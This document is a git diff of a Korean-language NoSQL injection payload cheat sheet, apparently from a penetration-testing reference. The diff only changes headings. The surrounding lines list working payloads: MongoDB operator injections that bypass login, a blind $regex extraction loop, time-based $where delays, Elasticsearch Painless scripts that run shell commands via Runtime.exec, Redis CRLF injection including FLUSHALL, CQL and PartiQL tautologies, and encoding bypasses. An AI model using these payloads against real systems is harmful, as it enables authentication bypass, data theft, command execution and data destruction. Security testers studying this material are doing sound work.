@@ -1,6 +1,6 @@
 ### 기본 페이로드
 
-**MongoDB Operator Injection (JSON body, 인증 우회):**
+#### MongoDB Operator Injection (JSON body, 인증 우회)
 ```json
 {"username":"admin","password":{"$ne":""}}
 {"username":"admin","password":{"$ne":null}}
@@ -10,7 +10,7 @@
 {"username":{"$in":["admin","root","administrator"]},"password":{"$ne":""}}
 ```
 
-**MongoDB Query string (qs `extended:true`):**
+#### MongoDB Query string (qs `extended:true`)
 ```
 ?username=admin&password[$ne]=
 ?username=admin&password[$regex]=^a
@@ -26,13 +26,13 @@
 {"$where":"function(){var d=new Date();while((new Date())-d<3000){}; return true}"}
 ```
 
-**MongoDB Aggregation 인젝션:**
+#### MongoDB Aggregation 인젝션
 ```json
 {"$or":[{"username":"admin"},{"role":"admin"}]}
 {"name":{"$regex":"^.*","$options":"i"}}
 ```
 
-**Blind extraction ($regex):**
+#### Blind extraction ($regex)
 ```bash
 # 첫 글자 추측
 for c in {a..z}; do
@@ -44,40 +44,40 @@ done
 {"username":"admin","password":{"$regex":"^pass"}}
 ```
 
-**Elasticsearch Painless script:**
+#### Elasticsearch Painless script
 ```json
 {"query":{"script_score":{"script":{"source":"Runtime.getRuntime().exec(\"id\")"}}}}
 {"query":{"function_score":{"script_score":{"script":"java.lang.Runtime.getRuntime().exec('id')"}}}}
 {"script_fields":{"x":{"script":{"source":"java.lang.Runtime.getRuntime().exec('id')"}}}}
 ```
 
-**Redis 명령 인젝션 (CRLF 결합):**
+#### Redis 명령 인젝션 (CRLF 결합)
 ```
 ?key=foo%0d%0aFLUSHALL%0d%0a
 ?key=foo%0d%0aSET%20admin%201%0d%0a
 ```
 
-**CouchDB:**
+#### CouchDB
 ```json
 {"selector":{"$or":[{"role":"admin"},{"_id":{"$gt":""}}]}}
 ```
 
-**Cassandra/CQL (sqli-scanner 페이로드 일부 적용):**
+#### Cassandra/CQL (sqli-scanner 페이로드 일부 적용)
 ```
 ' OR 1=1 ALLOW FILTERING; --
 ```
 
-**DynamoDB PartiQL:**
+#### DynamoDB PartiQL
 ```
 SELECT * FROM Users WHERE name = 'admin' OR 1=1
 ```
 
-**Time-based Blind (MongoDB `$where`):**
+#### Time-based Blind (MongoDB `$where`)
 ```json
 {"username":"admin","$where":"function(){var d=new Date();while((new Date())-d<5000){}; return true}"}
 ```
 
-**Operator Injection in nested key:**
+#### Operator Injection in nested key
 ```json
 {"user":{"$ne":null},"profile":{"settings":{"$ne":null}}}
 ```
@@ -99,7 +99,7 @@ SELECT * FROM Users WHERE name = 'admin' OR 1=1
 | JSON body만 검증 | Query string에서 `qs` 객체 reconstruct로 동일 영향 |
 | Unicode escape | `\u0024ne` (= `$ne`) — JSON 파서 디코딩 후 통과 |
 
-**Encoding 변형:**
+#### Encoding 변형
 ```
 # URL encode
 ?password%5B%24ne%5D=  (= ?password[$ne]=)
